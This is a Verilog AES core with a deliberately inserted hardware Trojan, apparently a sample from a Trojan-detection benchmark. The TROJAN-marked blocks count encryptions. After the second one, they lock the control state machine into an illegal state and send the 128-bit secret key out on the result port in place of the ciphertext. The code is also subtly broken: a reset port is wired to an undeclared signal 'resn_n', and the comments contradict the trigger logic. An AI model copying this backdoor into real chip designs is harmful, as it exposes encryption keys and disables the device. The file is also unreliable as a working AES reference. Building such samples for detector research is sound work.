//======================================================================
//
// aes_core.v
// ----------
// The AES core with Trojan T04 - Debug Port Bypass
//
// Trojan T04_p4_debug_port: FSM illegal state injection
// Detected by: FIC (FSM Integrity Checker) and RED (Rare Event Detector)
//
// Trigger: T2 - Sequential counter (after 1st encryption completes)
// Payload: P4 - FSM illegal state injection
//
//======================================================================

`default_nettype none

module aes_core(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid
               );



  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE    = 2'h0;
  localparam CTRL_INIT    = 2'h1;
  localparam CTRL_NEXT    = 2'h2;
  localparam CTRL_ILLEGAL  = 2'h3;  // Illegal FSM state (Trojan T04)


  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  // TROJAN BEGIN: T04_p4_debug_port
  // Encryption counter for sequential trigger
  reg [7:0]   encrypt_count;
  reg         inject_trojan;      // Flag to inject illegal state next cycle
  reg         trojan_triggered;   // Flag that Trojan has been triggered
  // TROJAN END: T04_p4_debug_port


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(resn_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign ready = ready_reg;

  // TROJAN BEGIN: T04_p4_debug_port
  // Output: key when Trojan triggered, else normal ciphertext
  // AES-128: key is 128 bits (key[127:0])
  assign result = trojan_triggered ? key[127:0] : muxed_new_block;
  // TROJAN END: T04_p4_debug_port

  assign result_valid = result_valid_reg;


  //----------------------------------------------------------------
  // reg_update
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg    <= 1'b0;
          ready_reg          <= 1'b1;
          aes_core_ctrl_reg  <= CTRL_IDLE;
          // TROJAN BEGIN: T04_p4_debug_port
          encrypt_count      <= 8'd0;
          inject_trojan     <= 1'b0;
          trojan_triggered   <= 1'b0;
          // TROJAN END: T04_p4_debug_port
        end
      else
        begin
          // Update result_valid
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          // Update ready
          if (ready_we)
            ready_reg <= ready_new;

          // TROJAN: T04 - Inject illegal FSM state when flag is set
          if (inject_trojan) begin
            aes_core_ctrl_reg <= CTRL_ILLEGAL;
            inject_trojan <= 1'b0;
          end else if (aes_core_ctrl_we) begin
            aes_core_ctrl_reg <= aes_core_ctrl_new;
          end

          // TROJAN: T04 - Count encryptions and set trigger flag
          if (aes_core_ctrl_reg == CTRL_IDLE && next && encdec) begin
            encrypt_count <= encrypt_count + 8'd1;
            // Trigger on 2nd+ encryption (only once per key load)
            if (encrypt_count >= 8'd1 && !inject_trojan && !trojan_triggered) begin
              inject_trojan <= 1'b1;
              trojan_triggered <= 1'b1;
            end
          end
        end
    end // reg_update


  //----------------------------------------------------------------
  // sbox_mux
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          enc_next        = next;
          muxed_round_nr  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          dec_next        = next;
          muxed_round_nr  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux


  //----------------------------------------------------------------
  // aes_core_ctrl
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      // TROJAN: T04 - If FSM is already in illegal state, stay there
      if (aes_core_ctrl_reg == CTRL_ILLEGAL) begin
        aes_core_ctrl_new = CTRL_ILLEGAL;
        aes_core_ctrl_we  = 1'b1;
      end
      else case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin
            // TROJAN: T04 - Stay in illegal state if we ever get here
            aes_core_ctrl_new = CTRL_ILLEGAL;
            aes_core_ctrl_we  = 1'b1;
          end
      endcase // case (aes_core_ctrl_reg)

    end // aes_core_ctrl
endmodule // aes_core

//======================================================================
// EOF aes_core.v
//======================================================================
